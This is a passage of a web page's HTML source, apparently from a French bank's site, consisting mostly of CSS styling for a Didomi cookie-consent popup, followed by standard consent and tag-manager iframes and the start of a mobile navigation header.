    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
      padding: 30px 15px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
      margin-top: 0 !important
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-subtext {
      margin-bottom: 30px
    }

    #didomi-host .didomi-mobile .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
      margin-top: 0;
      margin-bottom: 30px
    }

    #didomi-host .didomi-mobile .didomi-popup-notice-text p {
      margin: 0
    }

    #didomi-host .didomi-mobile .didomi-popup-notice-text p span {
      font-size: 12px
    }

    #didomi-host .didomi-screen-xsmall .didomi-popup-notice-buttons {
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      margin-top: 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-popup-notice-buttons .didomi-components-button {
      margin: 10px 0 0 !important
    }

    #didomi-host .didomi-screen-xsmall .didomi-popup-with-x-button {
      padding-top: 0
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view>:first-child {
      padding-top: 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
      margin-bottom: 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
      padding: 0 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container>:first-child {
      margin-top: 20px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container>:last-child {
      margin-bottom: 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container~.didomi-popup-notice-logo-container {
      padding: 0 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
      padding: 15px
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
      margin-top: 0 !important
    }

    #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-subtext {
      margin-bottom: 15px
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html {
      position: fixed;
      z-index: 2147483640
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.shape-box {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.shape-banner {
      left: 0;
      right: 0
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.top {
      top: 0
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.bottom {
      bottom: 0
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.left {
      left: 0
    }

    #didomi-host #didomi-notice.didomi-custom-notice-html.right {
      right: 0
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-custom-notice-html {
      left: 0;
      right: 0
    }

    #didomi-host .didomi-consent-popup-body {
      padding: 30px 20px
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title {
      font-size: 12px;
      color: #999;
      text-transform: uppercase;
      margin-bottom: 8px;
      display: block;
      font-weight: 700;
      font-family: Arial
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__subtext {
      margin-bottom: 22px
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__explanation a {
      font-weight: 700;
      text-decoration: underline
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height {
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: center;
      -ms-flex-direction: column
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height.didomi-max-height-reached .didomi-exterior-border,
    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height.didomi-max-height-reached .didomi-popup-container {
      border-radius: 0
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border {
      box-sizing: border-box;
      margin: 0 auto;
      z-index: 2147483641;
      padding: 0 !important;
      max-height: 100%;
      display: flex
    }

    @media (-ms-high-contrast:none) {

      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences,
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-popup-container,
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border ::-ms-backdrop {
        display: block !important
      }
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-popup-container {
      flex: 1 0 auto;
      box-sizing: border-box;
      margin: 0 auto;
      padding: 0 !important;
      display: flex
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences {
      padding: 0;
      display: flex
    }

    @media (-ms-high-contrast:none) {

      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view,
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences ::-ms-backdrop {
        height: auto !important;
        overflow-y: auto
      }
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view {
      max-height: 100vh;
      height: 100%;
      height: fit-content;
      height: -webkit-fit-content;
      width: 100%;
      padding: 0;
      flex: 1;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: start;
      -moz-box-pack: start;
      -webkit-flex-pack: start;
      -ms-flex-pack: start;
      -moz-justify-content: flex-start;
      -webkit-justify-content: flex-start;
      justify-content: flex-start
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body {
      overflow-y: auto;
      padding: 10px 20px 0
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body>:last-child {
      margin-bottom: 20px
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header {
      box-sizing: border-box;
      flex: 1 0 auto;
      z-index: 2147483640;
      padding: 15px 20px
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer {
      box-sizing: border-box;
      flex: 1 0 auto;
      z-index: 2147483640;
      padding: 10px 20px
    }

    #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer .didomi-logo-icon {
      margin-left: 0
    }

    @media (-ms-high-contrast:none) {

      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer,
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header,
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view ::-ms-backdrop {
        flex: 1 0 0
      }
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view {
      max-height: -webkit-fill-available
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body {
      padding: 15px 15px 0
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body>:last-child {
      margin-bottom: 15px
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header {
      padding: 10px 15px;
      box-shadow: 0 3px 10px -2px rgba(0, 0, 0, .1)
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer {
      padding: 10px 15px;
      box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, .1)
    }

    #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer .didomi-consent-popup-actions {
      padding: 0
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing__buttons {
      -webkit-flex-shrink: 0;
      -webkit-box-flex: 0;
      -moz-flex-shrink: 0;
      -ms-flex-negative: 0;
      flex-shrink: 0;
      margin-left: 15px
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing__buttons_tcf_v2 {
      align-self: flex-start
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center;
      margin-bottom: 8px
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor {
      flex-wrap: wrap
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-purpose__buttons,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-vendor__buttons,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-purpose__buttons,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__buttons {
      -webkit-flex-shrink: 0;
      -webkit-box-flex: 0;
      -moz-flex-shrink: 0;
      -ms-flex-negative: 0;
      flex-shrink: 0;
      margin-left: 15px
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-vendor__right_aligned_buttons,
    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__right_aligned_buttons {
      float: right;
      margin-top: -2px
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-partner {
      display: inline-block;
      margin-right: 15px;
      margin-bottom: 5px
    }

    #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-partner a {
      border-bottom: 1px dashed #000
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor {
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: start;
      -ms-flex-align: start;
      -webkit-align-items: flex-start;
      -moz-align-items: flex-start;
      align-items: flex-start;
      margin-bottom: 8px
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-purpose__buttons,
    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__buttons {
      -webkit-flex-shrink: 0;
      -webkit-box-flex: 0;
      -moz-flex-shrink: 0;
      -ms-flex-negative: 0;
      flex-shrink: 0;
      margin-left: 0;
      margin-top: 10px
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: start;
      -moz-box-pack: start;
      -webkit-flex-pack: start;
      -ms-flex-pack: start;
      -moz-justify-content: flex-start;
      -webkit-justify-content: flex-start;
      justify-content: flex-start;
      -webkit-box-align: start;
      -ms-flex-align: start;
      -webkit-align-items: flex-start;
      -moz-align-items: flex-start;
      align-items: flex-start
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-category__name,
    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__purpose {
      margin-bottom: 6px
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-category__description,
    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__description {
      font-size: 12px
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-category__description {
      margin-bottom: 20px;
      font-size: 12px
    }

    #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-data-processing__buttons {
      margin-left: 0
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-vendor__right_aligned_buttons {
      display: flex;
      float: none !important;
      margin-top: 0 !important
    }

    #didomi-host .didomi-consent-popup-information .didomi-consent-popup-body {
      max-height: 300px;
      overflow: auto
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list {
      height: 280px;
      overflow: auto;
      border: 2px solid rgba(0, 0, 0, .05);
      padding: 12px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body {
      padding: 20px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-details-title {
      font-weight: 700
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-container-click-all {
      font-weight: 700;
      background: rgba(0, 0, 0, .05);
      padding: 8px 12px;
      margin: 0 !important
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-popup-title {
      cursor: pointer
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-container {
      word-break: break-all;
      border: 2px solid rgba(0, 0, 0, .05);
      padding: 12px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-trigger {
      font-size: 12px;
      color: #666;
      font-weight: 700
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-trigger>.trigger-icon {
      font-size: 12px !important
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-label {
      display: inline-block;
      margin-left: 5px;
      padding: 1px 4px;
      border-radius: 2px;
      background: #fff;
      font-weight: 800;
      font-size: 10px;
      color: #757575;
      line-height: 100%
    }

    [dir=rtl] #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-label {
      margin-left: 0;
      margin-right: 5px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer,
    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer {
      font-size: 14px;
      color: #999;
      font-weight: 700;
      margin-bottom: 10px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer p,
    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer p {
      margin: 0
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer a,
    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer a {
      color: #999
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-vendor__description {
      padding-top: 3px
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendor-storage-duration .didomi-vendor-storage-duration__title {
      margin-top: 35px;
      margin-bottom: 0;
      font-weight: 700
    }

    #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendor-storage-duration .didomi-vendor-storage-duration__content {
      margin-top: 0;
      font-size: 14px;
      font-weight: 700;
      color: #999
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer,
    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer {
      margin-top: 15px !important
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category {
      padding: 0;
      margin: 12px 0 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .label-click {
      font-weight: 700
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children {
      border-left: 1px solid #e7e2d6;
      padding: 0 0 5px 15px;
      margin-left: 15px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__name {
      font-weight: 700;
      font-size: 15px;
      margin-bottom: 8px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__description {
      font-size: 14px;
      font-weight: 300
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children {
      margin-top: 12px;
      padding-bottom: 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-category {
      padding: 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-category__name {
      font-size: 14px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing {
      border: none;
      padding: 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__purpose {
      font-size: 14px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing__description {
      padding: 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-preferences-purposes-features {
      font-size: 14px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing {
      font-weight: 700
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description {
      font-size: 14px;
      color: #333
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose {
      display: flex;
      flex: 2;
      justify-content: center;
      margin: 5px 0 5px 15px;
      text-transform: uppercase;
      font-size: 14px;
      line-height: 17px;
      color: #999
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose_explanation {
      margin: 0;
      padding: 0;
      font-size: 14px;
      font-weight: 700;
      color: #999
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon {
      border-bottom: none
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon svg {
      margin-top: -5px
    }

    [dir=rtl] #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon:after {
      text-align: right
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions {
      display: flex;
      justify-content: end;
      align-items: center;
      text-align: center;
      background-color: #fff;
      border-radius: 1px;
      margin-bottom: 15px;
      margin-top: 8px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_actions_title {
      font-weight: 700;
      color: #333
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_action_buttons {
      float: right
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-categories-nested .didomi-consent-popup-data-processing {
      padding: 0;
      margin: 12px 0 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-categories-nested .didomi-consent-popup-data-processing__purpose {
      font-size: 15px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list {
      display: flex;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      margin-bottom: 16px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-body__title {
      margin-bottom: 0
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link {
      cursor: pointer;
      box-shadow: 1px 1px 0 0 rgba(0, 0, 0, .1);
      background-color: #fff;
      border: 1px solid #eee;
      font-size: 12px;
      color: #757575;
      font-weight: 700;
      padding: 5px 15px;
      text-transform: none
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link span {
      background: transparent
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions .didomi-consent-popup-information-save {
      margin-right: 15px;
      font-style: italic;
      color: #757575;
      font-size: 14px
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_actions_title {
      margin-right: 15px
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose {
      display: inline-block;
      margin-left: 0 !important
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer {
      height: auto !important
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions {
      padding: 8px 0
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions:not(.didomi-buttons-all) {
      flex-direction: row
    }

    #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions .didomi-consent-popup-information-save {
      text-align: center;
      margin-top: 5px
    }

    #didomi-host .didomi-consent-popup__3e6e3e05-9201-4614-a13e-b9649d1fa0e4 .didomi-components-accordion-label-container .didomi-consent-popup-data-processing__purpose {
      font-size: 15px !important
    }

    #didomi-host .didomi-consent-popup-category__children .didomi-consent-popup-preferences-purposes-features,
    #didomi-host .didomi-consent-popup__3e6e3e05-9201-4614-a13e-b9649d1fa0e4 .didomi-consent-popup-category__children .didomi-consent-popup-categories .didomi-consent-popup-data-processing .didomi-components-accordion .didomi-components-accordion-label-container .didomi-consent-popup-data-processing__purpose {
      font-size: 14px !important
    }

    #didomi-host .didomi-consent-popup-preferences-purposes-features {
      margin-top: 22px
    }

    #didomi-host .didomi-consent-popup-preferences-purposes-features div {
      display: inline
    }

    .didomi-continue-without-agreeing {
      text-decoration: underline;
      cursor: pointer;
      color: #444
    }

    #didomi-host .didomi-x-button {
      cursor: pointer;
      display: block;
      height: 36px;
      width: 36px;
      padding: 2px 0 2px 2px;
      border-radius: 18px;
      position: absolute;
      top: -18px;
      right: -18px;
      color: #fff;
      background-color: #095d70;
      border-style: none
    }

    #didomi-host .didomi-x-button .didomi-cross-icon {
      fill: #fff
    }

    [dir=rtl] #didomi-host .didomi-x-button {
      right: auto;
      left: -18px
    }

    #didomi-host .didomi-mobile .didomi-x-button {
      height: 48px;
      width: 48px;
      padding: 0 0 0 2px;
      border-radius: 0;
      background-color: transparent !important;
      top: 8px;
      right: 8px
    }

    #didomi-host .didomi-mobile .didomi-x-button .didomi-cross-icon {
      fill: #000
    }

    [dir=rtl] #didomi-host .didomi-mobile .didomi-x-button {
      right: auto;
      left: 8px
    }

    #didomi-host .didomi-screen-xsmall .didomi-x-button {
      height: 48px;
      width: 48px;
      padding: 0 0 0 2px;
      border-radius: 0;
      background-color: transparent !important;
      top: 8px;
      right: 8px
    }

    #didomi-host .didomi-screen-xsmall .didomi-x-button .didomi-cross-icon {
      fill: #000
    }

    [dir=rtl] #didomi-host .didomi-screen-xsmall .didomi-x-button {
      right: auto;
      left: 8px
    }

    #didomi-host {
      font-family: Roboto;
    }

    #didomi-host a:not(.didomi-no-link-style) {
      text-decoration: underline;
      color: #0091DB
    }

    #didomi-host .didomi-popup-notice {
      padding: 40px;
    }

    #didomi-host h2 {
      font-size: 24px !important;
      margin-bottom: 30px;
    }

    .didomi-popup-title {
      font-size: 16px;
    }

    #didomi-host .didomi-exterior-border {
      border-radius: 10px;
      border: 1px solid rgba(0, 0, 0, 0.1) !important;
    }

    #didomi-host .didomi-popup-backdrop {
      background-color: hsla(0, 0%, 10%, .5) !important;
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-body__title {
      margin-bottom: 0;
      text-transform: initial;
      font-weight: bold;
      color: #000;
    }

    #didomi-host .didomi-popup-body .didomi-popup-body-section {
      margin-bottom: 35px;
    }

    #didomi-host a,
    #didomi-host p,
    #didomi-host span {
      font-size: 14px;
      font-weight: normal;
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title span {
      font-weight: bold;
      color: #000;
      text-transform: initial;
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions {
      display: none;
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing {
      font-weight: normal;
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title {
      font-size: 14px;
      text-transform: normal;
    }

    #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title span {
      font-weight: bold;
    }

    #didomi-host #didomi-consent-popup .didomi-consent-popup-preferences .didomi-popup-header .didomi-popup-title span {
      font-size: 16px;
    }

    #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link {
      border: none;
      box-shadow: none;
      color: #0091DB;
    }

    #didomi-host .didomi-popup-notice .didomi-notice-view-partners-link {
      display: none;
    }

    #didomi-host a.lien-partenaire {
      color: #000 !important;
      text-decoration: none;
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-logo {
      width: 150px;
    }

    #didomi-host .didomi-popup-container .didomi-popup-notice-logo-container {
      text-align: left !important;
    }

    #didomi-host .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
      margin-bottom: -30px;
    }
  </style>
  <div id="didomi-host" data-nosnippet="true" aria-hidden="true">
    <div class="notranslate didomi-screen-small didomi-mobile didomi-consent-popup__3bdae87d-5147-4773-82cd-1044a2016ac4"></div>
  </div><iframe name="__tcfapiLocator" title="__tcfapiLocator" style="display: none;"></iframe><!-- Google Tag Manager (noscript) --><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-&#10;5K2PFQ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><!-- End Google Tag Manager (noscript) -->
  <section id="edit-bar">
  </section>
  <div class="global-overlay"></div>
  <div class="page">

    <header class="wrapper-header">

      <!-- Mobile nav buttons -->
      <div class="button-menu__container" id="buttonMenu">
        <button class="button-menu button-menu__open">
          <img width="25" height="22" src="/bredfr/++theme++bredfr/assets/images/mobile-nav-open.png" alt="Navigation mobile ouvrir">
          <span class="button-menu__label">Menu</span>
        </button>
        <button class="button-menu button-menu__close">
          <img width="25" height="22" src="/bredfr/++theme++bredfr/assets/images/mobile-nav-close.png" alt="Navigation mobile fermer">
          <span class="button-menu__label">Fermer</span>
        </button>
      </div>

